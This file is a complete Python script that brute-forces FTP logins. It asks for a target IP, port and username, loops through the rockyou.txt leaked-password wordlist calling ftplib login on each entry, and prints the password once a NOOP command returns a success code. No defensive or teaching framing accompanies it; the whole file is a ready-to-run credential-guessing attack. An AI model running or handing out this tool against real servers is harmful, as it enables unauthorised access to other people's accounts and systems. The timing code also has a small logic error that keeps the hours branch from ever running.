import time
import ftplib

IP_ADDR = input("enter the target ip address: ")
PORT_NUM = input("enter port number: ")
username = input("enter target username: ")
file_path = "./rockyou.txt"
time_start = time.time() 		#start clock
server = ftplib.FTP()
server.connect(IP_ADDR,int(PORT_NUM))
doc_len = len(open(file_path, "r", errors='replace').readlines())
lines = []
with open(file_path, "r", errors='replace') as f:
	for _ in range(doc_len):
		lines.append(f.readline())
num_attempts = 0

for i in range(doc_len):
	num_attempts += 1
	print(num_attempts)
	#========pull passwords from file line by line======
	potential_password = lines[i]
	#========strip passwords of new line char===========
	potential_password = potential_password.rstrip('\n')
	#========ATTEMPT FTP LOGIN HERE====================
	try:
		server.login(username,potential_password)
		check_login = server.voidcmd("NOOP")	#send NOOP cmd and wait for 2xx response
		check_login = check_login[0] #get first char of response
		if(check_login == '2'):		#if response print password and exit
			print(potential_password)
			break
	except:
		pass
#time.sleep(300)
time_stop = time.time()			#end clock
time_check = time_stop - time_start
if (time_check > 60):			#convert time to minutes and print
	tt_complete = str((time_stop - time_start) / 60)
	print("time to complete: " + tt_complete + " minutes")
elif (time_check > 3600):	#convert time to hours and print
	tt_complete = str((time_stop - time_start) / 3600)
	print("time to complete: " + tt_complete + " hours")
else:						#print time in seconds
	tt_complete = str(time_stop - time_start)
	print("time to complete: " + tt_complete + " seconds")